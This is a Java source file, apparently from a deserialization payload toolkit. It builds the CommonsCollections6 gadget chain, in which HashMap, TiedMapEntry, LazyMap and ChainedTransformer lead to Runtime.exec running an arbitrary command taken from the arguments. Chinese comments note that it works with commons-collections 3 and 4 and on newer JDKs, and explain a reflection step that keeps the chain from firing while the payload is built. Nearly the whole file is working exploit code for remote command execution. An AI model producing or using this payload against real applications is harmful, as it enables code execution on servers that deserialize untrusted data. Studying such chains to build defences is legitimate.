package com.Jasetol.payloads;

import com.Jasetol.utils.ParseArgs;
import com.Jasetol.utils.Reflect;
import com.Jasetol.utils.SerWithUnSer;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;

/*
 * Gadget:
 *   HashMap#readObject
 *     TiedMapEntry#hashCode
 *       TiedMapEntry#getValue
 *         LazyMap#get
 *           ChainedTransformer#transform
 *             ConstantTransformer#transform
 *             InvokerTransformer#transform
 * 1. 可以在 commons-collections3/commons-collections4 的依赖下使用
 *      在 commons-collections4 依赖下的使用只需要换一种方法创建 LazyMap 对象即可
 *        LazyMap lazyMap = LazyMap.lazyMap(new HashMap(), chainedTransformer);
 * 2. 可以在高版本JDK中使用
 * */
public class CommonsCollections06 {
    public static Object getObject() throws Exception{
        // 构造 Transformer[] 数组
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{ParseArgs.cmd})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(),"ky0116");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"ky0116");
        // 反射对字段进行赋值,防止在构造 payload 的时候触发 Gadget
        Reflect.reflectSetField(tiedMapEntry,"map",lazyMap);
        Reflect.reflectSetField(chainedTransformer,"iTransformers",transformer);
        return hashMap;
    }

    public static void main(String[] args) throws Exception{
        ParseArgs.parseArgs(args);
        HashMap hashMap = (HashMap) getObject();
        byte[] bytes = SerWithUnSer.serialize(hashMap);
        SerWithUnSer.unSerialize(bytes);
    }
}
